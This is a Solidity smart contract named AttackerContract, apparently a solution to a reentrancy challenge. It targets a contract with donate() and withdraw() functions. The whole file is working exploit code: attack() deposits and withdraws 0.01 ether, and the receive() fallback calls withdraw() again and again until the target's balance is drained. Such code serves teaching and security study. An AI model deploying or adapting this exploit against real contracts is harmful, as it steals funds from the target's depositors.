// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";

interface IReentrance {

    function donate(address _to) external payable;
    function withdraw(uint _amount) external;

}

contract AttackerContract {
    
    IReentrance targetContract;

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
    }

    function attack() external payable {
       targetContract.donate{value: 0.01 ether}(address(this));
       targetContract.withdraw(0.01 ether); 
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        uint totalBalance = address(targetContract).balance;
        if (totalBalance >= 0.01 ether) {
            targetContract.withdraw(0.01 ether);
        } else if (address(targetContract).balance < 0.01 ether && totalBalance > 0) {
            targetContract.withdraw(totalBalance);
        } 
    }
}